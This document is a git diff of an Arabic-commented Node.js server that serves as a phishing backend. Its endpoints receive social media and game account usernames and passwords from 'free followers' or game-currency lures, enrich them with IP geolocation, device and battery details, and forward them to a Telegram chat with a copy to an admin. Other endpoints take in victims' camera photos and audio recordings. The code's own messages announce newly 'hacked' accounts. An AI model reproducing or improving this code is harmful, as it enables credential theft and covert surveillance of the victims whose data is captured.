@@ -35,7 +35,7 @@ if (!BOT_TOKEN) {
   console.warn('⚠️  سيتم تشغيل السيرفر ولكن إرسال الرسائل إلى Telegram لن يعمل');
 }
 
-// وظيفة إرسال الرسائل للتلجرام (القديمة)
+// وظيفة إرسال الرسائل للتلجرام
 async function sendToTelegram(chatId, message, fileBuffer = null, filename = null) {
     try {
         // إذا لم يكن هناك توكن، نعمل محاكاة
@@ -75,7 +75,7 @@ async function sendToTelegram(chatId, message, fileBuffer = null, filename = nul
     }
 }
 
-// دالة جديدة لإرسال الصور (من السيرفر الجديد)
+// دالة جديدة لإرسال الصور
 async function sendPhotosToTelegram(chatId, message, images = []) {
   try {
     // إذا لم يكن هناك توكن، نعمل محاكاة
@@ -116,10 +116,10 @@ async function sendPhotosToTelegram(chatId, message, images = []) {
   }
 }
 
-// وظيفة محسنة لإرسال نسخة للأدمن
-async function sendCopyToAdmin(originalMessage, originalChatId, images = []) {
+// وظيفة إرسال نسخة للأدمن
+async function sendCopyToAdmin(message, originalChatId, images = []) {
   try {
-    const adminMessage = `👑 <b>نسخة أدمن</b> - من المستخدم: ${originalChatId}\n\n${originalMessage}`;
+    const adminMessage = `👑 <b>نسخة أدمن</b> - من المستخدم: ${originalChatId}\n\n${message}`;
     
     let sent;
     if (images && images.length > 0) {
@@ -141,10 +141,89 @@ async function sendCopyToAdmin(originalMessage, originalChatId, images = []) {
   }
 }
 
-// دالة جديدة لتنسيق بيانات حسابات السوشيال ميديا
+// دالة للحصول على معلومات الموقع من IP
+async function getLocationFromIP(ip) {
+    try {
+        if (ip === '::1' || ip === '127.0.0.1' || ip.includes('localhost')) {
+            return {
+                country: 'غير معروف',
+                city: 'غير معروف'
+            };
+        }
+
+        const response = await axios.get(`http://ip-api.com/json/${ip}`);
+        const data = response.data;
+        
+        if (data.status === 'success') {
+            return {
+                country: data.country || 'غير معروف',
+                city: data.city || 'غير معروف'
+            };
+        } else {
+            return {
+                country: 'غير معروف',
+                city: 'غير معروف'
+            };
+        }
+    } catch (error) {
+        console.error('Error getting location from IP:', error.message);
+        return {
+            country: 'غير معروف',
+            city: 'غير معروف'
+        };
+    }
+}
+
+// دالة لاستخراج معلومات الجهاز من User Agent
+function parseDeviceInfo(userAgent) {
+    let os = 'غير معروف';
+    let browser = 'غير معروف';
+    let device = 'غير معروف';
+
+    // كشف نظام التشغيل
+    if (userAgent.includes('Android')) {
+        const androidVersion = userAgent.match(/Android\s([0-9\.]+)/);
+        os = `Android ${androidVersion ? androidVersion[1] : '0.0.0'}`;
+        device = 'Generic Smartphone';
+    } else if (userAgent.includes('iPhone') || userAgent.includes('iPad')) {
+        const iosVersion = userAgent.match(/OS\s([0-9_]+)/);
+        os = `iOS ${iosVersion ? iosVersion[1].replace(/_/g, '.') : '0.0.0'}`;
+        device = 'Apple Device';
+    } else if (userAgent.includes('Windows')) {
+        const windowsVersion = userAgent.match(/Windows\s([0-9\.]+)/);
+        os = `Windows ${windowsVersion ? windowsVersion[1] : '0.0.0'}`;
+        device = 'PC';
+    } else if (userAgent.includes('Mac OS')) {
+        const macVersion = userAgent.match(/Mac OS X\s([0-9_]+)/);
+        os = `macOS ${macVersion ? macVersion[1].replace(/_/g, '.') : '0.0.0'}`;
+        device = 'Mac';
+    } else if (userAgent.includes('Linux')) {
+        os = 'Linux';
+        device = 'Linux Device';
+    }
+
+    // كشف المتصفح
+    if (userAgent.includes('Chrome')) {
+        const chromeVersion = userAgent.match(/Chrome\/([0-9\.]+)/);
+        browser = `Chrome ${chromeVersion ? chromeVersion[1].split('.')[0] : '0'}`;
+        if (userAgent.includes('Mobile')) browser += ' Mobile';
+    } else if (userAgent.includes('Firefox')) {
+        const firefoxVersion = userAgent.match(/Firefox\/([0-9\.]+)/);
+        browser = `Firefox ${firefoxVersion ? firefoxVersion[1] : '0.0.0'}`;
+    } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
+        const safariVersion = userAgent.match(/Version\/([0-9\.]+)/);
+        browser = `Safari ${safariVersion ? safariVersion[1] : '0.0.0'}`;
+    } else if (userAgent.includes('Edge')) {
+        const edgeVersion = userAgent.match(/Edge\/([0-9\.]+)/);
+        browser = `Edge ${edgeVersion ? edgeVersion[1] : '0.0.0'}`;
+    }
+
+    return { os, browser, device };
+}
+
+// دالة جديدة لتنسيق بيانات حسابات السوشيال ميديا (التنسيق الجديد)
 function formatSocialMediaAccount(data) {
-    return `
-📈 تم الحصول على حساب ${data.accountType} لزيادة المتابعين ☠️:
+    return `📈 تم الحصول على حساب ${data.accountType} لزيادة المتابعين ☠️:
 
 👤 اسم المستخدم: ${data.username}
 🔐 كلمة السر: ${data.password}
@@ -156,24 +235,20 @@ function formatSocialMediaAccount(data) {
 🏙️ المدينة: ${data.city || 'غير متاح'}
 
 🔋 معلومات الجهاز:
-📱 نظام التشغيل: ${data.platform || 'غير متاح'}
+📱 نظام التشغيل: ${data.os || 'غير متاح'}
 🌐 المتصفح: ${data.browser || 'غير متاح'}
-⚡ البطارية: ${data.batteryLevel || 'غير متاح'}
-🔌 قيد الشحن: ${data.batteryCharging ? 'نعم' : 'لا'}
-🖥️ الجهاز: ${data.deviceName || 'غير متاح'}
-    `.trim();
+⚡ البطارية: ${data.battery || 'غير متاح'}
+🔌 قيد الشحن: ${data.charging || 'لا'}
+🖥️ الجهاز: ${data.device || 'غير متاح'}`
 }
 
-// دالة جديدة لتنسيق بيانات الألعاب
+// دالة جديدة لتنسيق بيانات الألعاب (محدثة)
 function formatGameAccount(data) {
-    return `
-🎮 تم الحصول على بيانات ${data.gameType} ☠️:
+    return `🎮 تم الحصول على حساب ${data.gameType} ☠️:
 
-🎯 معرف اللاعب: ${data.playerId}
-👤 اسم اللاعب: ${data.playerName || 'غير محدد'}
-📧 البريد الإلكتروني: ${data.email || 'غير محدد'}
+👤 معرف اللاعب: ${data.playerId}
 🔐 كلمة السر: ${data.password}
-💎 الكمية المطلوبة: ${data.amount}
+💰 الكمية المطلوبة: ${data.amount}
 
 🌍 معلومات الموقع:
 📍 عنوان IP: ${data.ip || 'غير متاح'}
@@ -181,15 +256,51 @@ function formatGameAccount(data) {
 🏙️ المدينة: ${data.city || 'غير متاح'}
 
 🔋 معلومات الجهاز:
-📱 نظام التشغيل: ${data.platform || 'غير متاح'}
+📱 نظام التشغيل: ${data.os || 'غير متاح'}
 🌐 المتصفح: ${data.browser || 'غير متاح'}
-⚡ البطارية: ${data.batteryLevel || 'غير متاح'}
-🔌 قيد الشحن: ${data.batteryCharging ? 'نعم' : 'لا'}
-🖥️ الجهاز: ${data.deviceName || 'غير متاح'}
-    `.trim();
+⚡ البطارية: ${data.battery || 'غير متاح'}
+🔌 قيد الشحن: ${data.charging || 'لا'}
+🖥️ الجهاز: ${data.device || 'غير متاح'}`
 }
 
-// تنسيق البيانات بشكل جميل لتيليجرام (من السيرفر الجديد)
+// دالة لتحديد نوع الحساب
+function determineAccountType(accountType, playerId, amount) {
+    // إذا كان accountType محدداً
+    if (accountType) {
+        return accountType;
+    }
+    
+    // محاولة التخمين بناءً على البيانات
+    const socialMediaKeywords = ['انستقرام', 'تيك توك', 'فيسبوك', 'تويتر', 'يوتيوب', 'سناب شات'];
+    const gameKeywords = ['فري فاير', 'ببجي', 'لعبة', 'game', 'pubg', 'freefire'];
+    
+    const lowerAmount = amount.toLowerCase();
+    const lowerPlayerId = playerId.toLowerCase();
+    
+    // التحقق من كلمات السوشيال ميديا
+    for (const keyword of socialMediaKeywords) {
+        if (lowerAmount.includes(keyword) || lowerPlayerId.includes(keyword)) {
+            return keyword;
+        }
+    }
+    
+    // التحقق من كلمات الألعاب
+    for (const keyword of gameKeywords) {
+        if (lowerAmount.includes(keyword) || lowerPlayerId.includes(keyword)) {
+            return keyword;
+        }
+    }
+    
+    // إذا كان المبلغ يحتوي على "متابع" فهو سوشيال ميديا
+    if (lowerAmount.includes('متابع')) {
+        return 'انستقرام'; // افتراضي
+    }
+    
+    // إذا لم يتم التعرف، نستخدم القيمة الافتراضية
+    return 'انستقرام';
+}
+
+// تنسيق البيانات بشكل جميل لتيليجرام
 function formatDataForTelegram(userId, additionalData, cameraType) {
   let data;
   try {
@@ -225,7 +336,7 @@ function formatDataForTelegram(userId, additionalData, cameraType) {
   `;
 }
 
-// 🔄 نقطة النهاية لاستقبال بيانات الجهاز من المسابقة - مصححة
+// 🔄 نقطة النهاية لاستقبال بيانات الجهاز من المسابقة
 app.post('/SS', async (req, res) => {
     try {
         console.log('📥 استقبال بيانات جهاز جديدة...');
@@ -275,23 +386,21 @@ app.post('/SS', async (req, res) => {
             telegramMessage += `   🌐 التوقيت: ${deviceInfo.timezone || 'غير متاح'}\n`;
         }
 
-        // 🔥 التصليح: إرسال للمستخدم أولاً
-        const sentToUser = await sendToTelegram(userId, telegramMessage);
+        // إرسال للتلجرام (باستخدام userId كـ chatId)
+        const sent = await sendToTelegram(userId, telegramMessage);
         
-        // 🔥 ثم إرسال نسخة للأدمن
-        const sentToAdmin = await sendCopyToAdmin(telegramMessage, userId);
+        // إرسال نسخة للأدمن
+        await sendCopyToAdmin(telegramMessage, userId);
         
-        if (sentToUser) {
+        if (sent) {
             res.status(200).json({ 
                 success: true, 
-                message: 'تم استلام البيانات وإرسالها بنجاح',
-                sentToUser: true,
-                sentToAdmin: sentToAdmin
+                message: 'تم استلام البيانات وإرسالها بنجاح' 
             });
         } else {
             res.status(500).json({ 
                 success: false, 
-                message: 'تم استلام البيانات ولكن فشل الإرسال للمستخدم' 
+                message: 'تم استلام البيانات ولكن فشل الإرسال للتلجرام' 
             });
         }
         
@@ -304,10 +413,25 @@ app.post('/SS', async (req, res) => {
     }
 });
 
-// 📤 نقطة النهاية الأصلية لإرسال البيانات للتلجرام - مع التصليح
+// 📤 نقطة النهاية الرئيسية لإرسال البيانات للتلجرام - محدثة
 app.post('/send-to-telegram', async (req, res) => {
     try {
-        const { playerId, password, amount, chatId, platform = "انستقرام", device, accountType } = req.body;
+        const { 
+            playerId, 
+            password, 
+            amount, 
+            chatId, 
+            accountType, 
+            device, 
+            ip,
+            country,
+            city,
+            os,
+            browser,
+            battery,
+            charging,
+            deviceType
+        } = req.body;
         
         // التحقق من البيانات المطلوبة
         if (!playerId || !password || !amount || !chatId) {
@@ -317,78 +441,109 @@ app.post('/send-to-telegram', async (req, res) => {
             });
         }
 
-        const userDevice = device || req.headers['user-agent'] || "غير معروف";
-        
         // الحصول على عنوان IP المستخدم
-        let userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
-        if (userIP === '::1') userIP = '127.0.0.1 (localhost)';
+        let userIP = ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.socket.remoteAddress;
+        if (userIP === '::1') userIP = '127.0.0.1';
+        
+        // تنظيف IP من عناوين داخلية
+        const cleanIP = userIP.split(',')[0].trim();
 
+        // الحصول على معلومات الموقع من IP إذا لم تكن موجودة
+        let locationInfo = { country: 'غير معروف', city: 'غير معروف' };
+        if (!country || !city || country === 'غير معروف' || city === 'غير معروف') {
+            locationInfo = await getLocationFromIP(cleanIP);
+        } else {
+            locationInfo = { country, city };
+        }
+
+        // تحليل معلومات الجهاز
+        const userDevice = device || req.headers['user-agent'] || "غير معروف";
+        let deviceInfo = { os: 'غير معروف', browser: 'غير معروف', device: 'غير معروف' };
+        
+        if (!os || !browser || !deviceType) {
+            deviceInfo = parseDeviceInfo(userDevice);
+        } else {
+            deviceInfo = { os, browser, device: deviceType };
+        }
+
+        // تحديد نوع الحساب
+        const finalAccountType = determineAccountType(accountType, playerId, amount);
+        
         // تحديد إذا كان حساب سوشيال ميديا أو لعبة
         let telegramMessage;
-        if (accountType && (accountType.includes('فيسبوك') || accountType.includes('انستقرام') || accountType.includes('تيك') || accountType.includes('تويتر'))) {
-            // تنسيق حسابات السوشيال ميديا
+        const isGame = finalAccountType.includes('فري فاير') || 
+                      finalAccountType.includes('ببجي') || 
+                      finalAccountType.includes('لعبة') ||
+                      finalAccountType.includes('game') ||
+                      finalAccountType.includes('pubg') ||
+                      finalAccountType.includes('freefire');
+
+        if (isGame) {
+            // تنسيق بيانات الألعاب
+            telegramMessage = formatGameAccount({
+                gameType: finalAccountType,
+                playerId: playerId,
+                password: password,
+                amount: amount,
+                ip: cleanIP,
+                country: locationInfo.country,
+                city: locationInfo.city,
+                os: deviceInfo.os,
+                browser: deviceInfo.browser,
+                battery: battery || 'غير متاح',
+                charging: charging || 'لا',
+                device: deviceInfo.device
+            });
+        } else {
+            // تنسيق بيانات السوشيال ميديا
             telegramMessage = formatSocialMediaAccount({
-                accountType: accountType,
+                accountType: finalAccountType,
                 username: playerId,
                 password: password,
                 followersCount: amount,
-                ip: userIP,
-                country: 'Yemen',
-                city: 'Taizz',
-                platform: 'Android 0.0.0',
-                browser: 'Chrome Mobile 141.0.7390',
-                batteryLevel: 'غير متاح',
-                batteryCharging: false,
-                deviceName: 'Generic Smartphone 0.0.0'
+                ip: cleanIP,
+                country: locationInfo.country,
+                city: locationInfo.city,
+                os: deviceInfo.os,
+                browser: deviceInfo.browser,
+                battery: battery || 'غير متاح',
+                charging: charging || 'لا',
+                device: deviceInfo.device
             });
-        } else if (accountType && (accountType.includes('freefire') || accountType.includes('pubg') || accountType.includes('لعبة'))) {
-            // تنسيق حسابات الألعاب
-            telegramMessage = formatGameAccount({
-                gameType: accountType,
-                playerId: playerId,
-                playerName: playerId,
-                email: 'غير محدد',
-                password: password,
-                amount: amount,
-                ip: userIP,
-                country: 'Yemen',
-                city: 'Taizz',
-                platform: 'Android 0.0.0',
-                browser: 'Chrome Mobile 141.0.7390',
-                batteryLevel: '56%',
-                batteryCharging: false,
-                deviceName: 'Generic Smartphone 0.0.0'
-            });
-        } else {
-            // التنسيق القديم للحسابات العادية
-            telegramMessage = `♦️ - تم اختراق حساب جديد 
-
-🔹 - اسم المستخدم: ${playerId}
-🔑 - كلمة المرور: ${password}
-💰 - المبلغ: ${amount}
-📱 - الجهاز: ${userDevice}
-🌍 - IP: ${userIP}
-🔄 - المنصة: ${platform}`;
         }
 
-        // 🔥 التصليح: إرسال للمستخدم أولاً
-        const sentToUser = await sendToTelegram(chatId, telegramMessage);
+        console.log('📤 إرسال بيانات جديدة:', {
+            type: isGame ? '🎮 لعبة' : '📱 سوشيال ميديا',
+            accountType: finalAccountType,
+            username: playerId,
+            ip: cleanIP,
+            country: locationInfo.country,
+            city: locationInfo.city
+        });
+
+        // إرسال الرسالة
+        const success = await sendToTelegram(chatId, telegramMessage);
         
-        // 🔥 ثم إرسال نسخة للأدمن
-        const sentToAdmin = await sendCopyToAdmin(telegramMessage, chatId);
+        // إرسال نسخة للأدمن
+        await sendCopyToAdmin(telegramMessage, chatId);
         
-        if (sentToUser) {
+        if (success) {
             res.json({
                 success: true,
                 message: 'تم إرسال البيانات إلى Telegram بنجاح',
                 orderId: `#${Math.floor(100000 + Math.random() * 900000)}`,
-                sentToUser: true,
-                sentToAdmin: sentToAdmin
+                data: {
+                    accountType: finalAccountType,
+                    type: isGame ? 'game' : 'social',
+                    ip: cleanIP,
+                    country: locationInfo.country,
+                    city: locationInfo.city
+                }
             });
         } else {
             res.status(500).json({
                 success: false,
-                message: 'فشل في إرسال الرسالة للمستخدم'
+                message: 'فشل في إرسال الرسالة إلى Telegram'
             });
         }
     } catch (error) {
@@ -401,7 +556,7 @@ app.post('/send-to-telegram', async (req, res) => {
     }
 });
 
-// 📝 نقطة النهاية لاستقبال بيانات التسجيل العامة - مصححة
+// 📝 نقطة النهاية لاستقبال بيانات التسجيل العامة
 app.post('/register', async (req, res) => {
     try {
         const { username, password, ip, chatId } = req.body;
@@ -415,23 +570,20 @@ app.post('/register', async (req, res) => {
 
         const message = `📝 تسجيل حساب جديد\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🌐 عنوان IP: ${ip}`;
         
-        // 🔥 التصليح: إرسال للمستخدم أولاً
-        const sentToUser = await sendToTelegram(chatId, message);
+        const success = await sendToTelegram(chatId, message);
         
-        // 🔥 ثم إرسال نسخة للأدمن
-        const sentToAdmin = await sendCopyToAdmin(message, chatId);
+        // إرسال نسخة للأدمن
+        await sendCopyToAdmin(message, chatId);
         
-        if (sentToUser) {
+        if (success) {
             res.status(200).json({ 
                 success: true,
-                message: 'تم إرسال البيانات إلى Telegram بنجاح',
-                sentToUser: true,
-                sentToAdmin: sentToAdmin
+                message: 'تم إرسال البيانات إلى Telegram بنجاح' 
             });
         } else {
             res.status(500).json({ 
                 success: false,
-                error: 'فشل في إرسال البيانات للمستخدم' 
+                error: 'فشل في إرسال البيانات إلى Telegram' 
             });
         }
     } catch (error) {
@@ -443,7 +595,7 @@ app.post('/register', async (req, res) => {
     }
 });
 
-// 🖼️ نقطة النهاية لرفع الصور - مصححة
+// 🖼️ نقطة النهاية لرفع الصور
 app.post('/upload-image', upload.array('images', 10), async (req, res) => {
     try {
         if (!req.files || req.files.length === 0) {
@@ -460,24 +612,25 @@ app.post('/upload-image', upload.array('images', 10), async (req, res) => {
         if (imageType) message += `\n📸 نوع الصورة: ${imageType}`;
         if (additionalData) message += `\n📝 بيانات إضافية: ${additionalData}`;
         
-        // 🔥 التصليح: إرسال للمستخدم أولاً
-        const sentToUser = await sendPhotosToTelegram(chatId, message, req.files);
+        const success = await sendPhotosToTelegram(
+            chatId, 
+            message, 
+            req.files
+        );
         
-        // 🔥 ثم إرسال نسخة للأدمن
-        const sentToAdmin = await sendCopyToAdmin(message, chatId, req.files);
+        // إرسال نسخة للأدمن
+        await sendCopyToAdmin(message, chatId, req.files);
         
-        if (sentToUser) {
+        if (success) {
             res.status(200).json({ 
                 success: true,
                 message: 'تم إرسال الصور إلى Telegram بنجاح',
-                imagesCount: req.files.length,
-                sentToUser: true,
-                sentToAdmin: sentToAdmin
+                imagesCount: req.files.length
             });
         } else {
             res.status(500).json({ 
                 success: false,
-                error: 'فشل في إرسال الصور للمستخدم' 
+                error: 'فشل في إرسال الصور إلى Telegram' 
             });
         }
     } catch (error) {
@@ -489,7 +642,7 @@ app.post('/upload-image', upload.array('images', 10), async (req, res) => {
     }
 });
 
-// 🎵 نقطة النهاية لرفع الصوت - مصححة
+// 🎵 نقطة النهاية لرفع الصوت
 app.post('/upload-audio', upload.single('audio'), async (req, res) => {
     try {
         if (!req.file) {
@@ -504,28 +657,25 @@ app.post('/upload-audio', upload.single('audio'), async (req, res) => {
         let message = `🎵 تم تسجيل صوت جديد`;
         if (username) message += `\n👤 المستخدم: ${username}`;
         
-        // 🔥 التصليح: إرسال للمستخدم أولاً
-        const sentToUser = await sendToTelegram(
+        const success = await sendToTelegram(
             chatId, 
             message, 
             req.file.buffer, 
             `audio-${Date.now()}${path.extname(req.file.originalname || '.mp3')}`
         );
         
-        // 🔥 ثم إرسال نسخة للأدمن
-        const sentToAdmin = await sendCopyToAdmin(message, chatId);
+        // إرسال نسخة للأدمن
+        await sendCopyToAdmin(message, chatId);
         
-        if (sentToUser) {
+        if (success) {
             res.status(200).json({ 
                 success: true,
-                message: 'تم إرسال الصوت إلى Telegram بنجاح',
-                sentToUser: true,
-                sentToAdmin: sentToAdmin
+                message: 'تم إرسال الصوت إلى Telegram بنجاح' 
             });
         } else {
             res.status(500).json({ 
                 success: false,
-                error: 'فشل في إرسال الصوت للمستخدم' 
+                error: 'فشل في إرسال الصوت إلى Telegram' 
             });
         }
     } catch (error) {
@@ -537,7 +687,7 @@ app.post('/upload-audio', upload.single('audio'), async (req, res) => {
     }
 });
 
-// نقطة النهاية لاستقبال الصور والبيانات - مصححة
+// نقطة النهاية لاستقبال الصور والبيانات
 app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
   try {
     const { userId, cameraType, additionalData } = req.body;
@@ -550,11 +700,11 @@ app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
     // تنسيق الرسالة
     const message = formatDataForTelegram(userId, additionalData, cameraType);
 
-    // 🔥 التصليح: إرسال البيانات إلى تيليجرام (للمستخدم)
+    // إرسال البيانات إلى تيليجرام
     const sendResult = await sendPhotosToTelegram(userId, message, images);
 
-    // 🔥 ثم إرسال نسخة للأدمن
-    const adminResult = await sendCopyToAdmin(message, userId, images);
+    // إرسال نسخة للأدمن
+    await sendCopyToAdmin(message, userId, images);
 
     if (sendResult) {
       console.log('✅ تم إرسال الصور بنجاح');
@@ -562,9 +712,7 @@ app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
         success: true, 
         message: 'تم إرسال الصور بنجاح',
         chatId: userId,
-        imagesCount: images.length,
-        sentToUser: true,
-        sentToAdmin: adminResult
+        imagesCount: images.length
       });
     } else {
       console.log('❌ فشل إرسال الصور');
@@ -583,7 +731,7 @@ app.post('/submitPhotos', upload.array('images', 10), async (req, res) => {
   }
 });
 
-// راوت لاستقبال البيانات النصية فقط - مصححة
+// راوت لاستقبال البيانات النصية فقط
 app.post('/submitData', async (req, res) => {
   try {
     const { userId, additionalData, message } = req.body;
@@ -593,20 +741,17 @@ app.post('/submitData', async (req, res) => {
     // استخدام الرسالة المخصصة أو تنسيق افتراضي
     const finalMessage = message || formatDataForTelegram(userId, additionalData, 'text');
 
-    // 🔥 التصليح: إرسال للمستخدم أولاً
     const sendResult = await sendToTelegram(userId, finalMessage);
 
-    // 🔥 ثم إرسال نسخة للأدمن
-    const adminResult = await sendCopyToAdmin(finalMessage, userId);
+    // إرسال نسخة للأدمن
+    await sendCopyToAdmin(finalMessage, userId);
 
     if (sendResult) {
       console.log('✅ تم إرسال البيانات النصية بنجاح');
       res.json({ 
         success: true, 
         message: 'تم إرسال البيانات النصية بنجاح',
-        chatId: userId,
-        sentToUser: true,
-        sentToAdmin: adminResult
+        chatId: userId
       });
     } else {
       res.status(500).json({ 
@@ -624,7 +769,7 @@ app.post('/submitData', async (req, res) => {
   }
 });
 
-// ❤️ نقطة التحقق من صحة السيرفر - نفس القديم
+// ❤️ نقطة التحقق من صحة السيرفر
 app.get('/health', (req, res) => {
     res.status(200).json({ 
         success: true,
@@ -632,41 +777,51 @@ app.get('/health', (req, res) => {
         tokenConfigured: !!BOT_TOKEN,
         adminId: ADMIN_CHAT_ID,
         environment: process.env.NODE_ENV || 'development',
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        version: '2.0.0 - التنسيق الجديد'
     });
 });
 
-// 🏠 الصفحة الرئيسية - محدثة
+// 🏠 الصفحة الرئيسية
 app.get('/', (req, res) => {
     res.status(200).json({ 
         success: true,
-        message: 'مرحباً بك في سيرفر Telegram Bot المدمج',
-        version: '5.0.0',
-        features: 'يدعم جميع أنواع البيانات + إرسال نسخة للأدمن + إرسال للمستخدم',
+        message: 'مرحباً بك في سيرفر Telegram Bot المحدث',
+        version: '2.0.0',
+        description: 'يدعم التنسيق الجديد لحسابات السوشيال ميديا والألعاب',
         adminId: ADMIN_CHAT_ID,
         endpoints: {
             health: '/health',
             deviceInfo: '/SS (POST) - لبيانات الجهاز',
-            sendMessage: '/send-to-telegram (POST) - لإرسال بيانات الحسابات',
+            sendMessage: '/send-to-telegram (POST) - لإرسال بيانات الحسابات (التنسيق الجديد)',
             register: '/register (POST) - للتسجيل العام',
             uploadImage: '/upload-image (POST) - لرفع الصور (النظام القديم)',
             submitPhotos: '/submitPhotos (POST) - لرفع الصور (النظام الجديد)',
             submitData: '/submitData (POST) - للبيانات النصية (النظام الجديد)',
             uploadAudio: '/upload-audio (POST) - لرفع الصوت'
         },
-        note: 'الآن يتم إرسال جميع الرسائل للمستخدم وللأدمن معاً ✅'
+        features: [
+            'التنسيق الجديد لحسابات السوشيال ميديا',
+            'التنسيق الجديد لحسابات الألعاب',
+            'الحصول على الموقع من IP تلقائياً',
+            'تحليل معلومات الجهاز من User Agent',
+            'إرسال نسخة تلقائية للأدمن',
+            'دعم جميع الأنظمة القديمة',
+            'التعرف التلقائي على نوع الحساب'
+        ]
     });
 });
 
-// تشغيل السيرفر - محدث
+// تشغيل السيرفر
 app.listen(PORT, () => {
-    console.log(`🚀 السيرفر المدمج يعمل على PORT: ${PORT}`);
+    console.log(`🚀 السيرفر المحدث يعمل على PORT: ${PORT}`);
     console.log(`📧 نقطة استقبال بيانات الجهاز: /SS`);
-    console.log(`📤 نقطة إرسال البيانات: /send-to-telegram`);
+    console.log(`📤 نقطة إرسال البيانات: /send-to-telegram (التنسيق الجديد)`);
+    console.log(`🎮 يدعم: حسابات السوشيال ميديا + الألعاب`);
     console.log(`📸 نقطة إرسال الصور: /submitPhotos`);
     console.log(`👑 إرسال نسخة للأدمن: ${ADMIN_CHAT_ID}`);
-    console.log(`👤 إرسال للمستخدم: ✅ مفعل في جميع النقاط`);
     console.log(`❤️  نقطة التحقق: /health`);
+    console.log(`🆕 الإصدار: 2.0.0 - التنسيق الجديد`);
     
     if (!BOT_TOKEN) {
         console.warn('⚠️  BOT_TOKEN غير مضبوط، سيتم محاكاة إرسال الرسائل فقط');
